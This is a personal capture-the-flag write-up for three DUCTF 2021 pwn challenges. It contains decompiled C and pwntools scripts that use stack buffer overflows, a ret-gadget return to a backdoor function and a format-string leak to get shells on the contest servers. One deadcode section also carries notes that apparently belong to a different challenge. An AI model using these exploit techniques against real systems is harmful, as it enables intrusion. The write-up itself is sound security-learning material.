---
title: '[CTF] - DUCTF'
slug: ductf
type: writeup
date: 2021-09-27
summary: 'DUCTF WriteUp...'
tags: [security, writeup]
---

# DUCTF WriteUp
## Pwn (4/9)
### deadcode
First things, we have to check file and checksec cmd to make something clearly.
We can see it a ELF 64bits file, no canary found, no pie,NX enabled (Non-eXecutable). It mean we can use IDA Pro 64bits to read and no canary,no pie, can’t execute in stack :D .
After that, i using IDA Pro 64 bits to read ELF file and can be get source code C like this.
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[24]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-8h]
  v5 = 0LL;
  buffer_init(argc, argv, envp);
  puts("\nI'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.");
  puts("\nWhat features would you like to see in my app?");
  gets(v4);
  if ( v5 == 0xDEADC0DELL )
  {
    puts("\n\nMaybe this code isn't so dead...");
    system("/bin/sh");
  }
  return 0;
}
```
I see *gets* funtion it mean have BufferOverFlow(bof) in there. This program’s flow is so ezzzzz. I just bypass condition *v5 = 0xDEADC0DE* in if condition and i can call system.
This is a simple chall : flag in s value
- Get input into format value
- Print Hello there, + format
==> I know this is Format string (fmt), so to exploit i have to find offset by payload = %x %x %x %x %x %x %x %x %x %x
using payload i can get offset = 6 ==> payload =  %6$s to leak flag :))) so ezz right ?
### outBackdoor
Status of this chall as same as deadcode, so maybe i can call it is version upgraded of deadcode.
Uisng IDA Pro to analyst :|
Read code i see a normal bof but don’t see flag or system funtion. After that, i check all funtion in IDA and i found outBackdoor funtion.
It is a system funtion, it can get shell for me :D . So i using bof to return address of this funtion to call outBackdoor.
To exploit i find outBackdoor address = 0x4011d7
```
pwndbg> p outBackdoor 
$1 = {} 0x4011d7 
pwndbg>
```
Offset = 16 + 8(old rbp)
==> Payload = 16 + 8 + address
Something, i get some trouble like this, i can get shell in local but i cant get shell in server ?? :D ?? wwhyy ???? WWhat happen to me :| Am i do somethings wwrong?
In a long time, i see a video teach me that i can be use ret to make it run. So i using ROPgadget to find ret and get it to exploit.
```
from pwn import * 
BIN = "./outBackdoor"
outBackdoor = 0x4011d7
ret = 0x0000000000401016
def exploit():
	payload = b"a"*16 + b"b"*8 + p64(ret) + p64(outBackdoor)
	io.recvuntil("Seriously though, what features would be cool? Maybe it could play a song?")
	io.sendline(payload)
	io.interactive()
#io = process(BIN)
io = remote("pwn-2021.duc.tf", 31921)
exploit()
```
### babygame
First I check file like this!
And I using IDA Pro 64bits to read source code C .
In this program have some function like : get_num(),set_username(),print_username() and game().
It have 3 case, if input == 1: I can reset username, if input == 2 i can print NAME value. if input = 1337 i am going to game() function.
get_num() function read input and convert it to number.
set_username() reset username for u by the way read input and write to NAME value using fread
print_username() show username to your terminal using puts
This is a main function becus it have system('/bin/sh'). It open file in path is randbuf with mode ‘rb’. After that, read first 4 bytes in header and cmp with input from get_num().
Bug:
- RANDBUF in a value after NAME value, so we can bof NAME value.
- get_num() can be using to connect NAME and RANDBUF becuz it don’t have null bytes after string.
Exploit:
- Connect string
- Bof RANDBUF
- Input = Fisrt 4 bytes of this file.
```
from pwn import *
BIN = "./babygame"
guess = b"\x7f\x45\x4c\x46" #0xfbad2488 #0x1e8c1e00000055de
Randpath = b"pwn"
def exploit():
   payload = b"a"*31
   io.recvuntil("Welcome, what is your name?")
   io.sendline(payload)
   io.recvuntil("> ")
   io.sendline(b"2")
   io.recvline()
   randadd = int.from_bytes(io.recvline().strip(), byteorder='little', signed=False)
   name = randadd - 32 + 0x209c
   print(hex(name))
   payload = Randpath + b"\x00"*(32-len(Randpath)) + p64(name)[0:6]
   # _breakpoint="""
   # 	b*set_username
   # 	"""
   # gdb.attach(io,_breakpoint)
   io.recvuntil("> ")
   io.sendline(b"1")
   io.recvuntil("What would you like to change your username to?")
   io.send(payload)
   io.recvuntil("> ")
   io.sendline(b"1337")
   io.recvuntil("guess: ")
   io.sendline("1179403647")
   io.interactive()
io = process(BIN)
io = remote("pwn-2021.duc.tf", 31907)
context.log_level="debug"
exploit()
```
## Web (solve 2 challenge)
### Inside-Out
### Cowboy World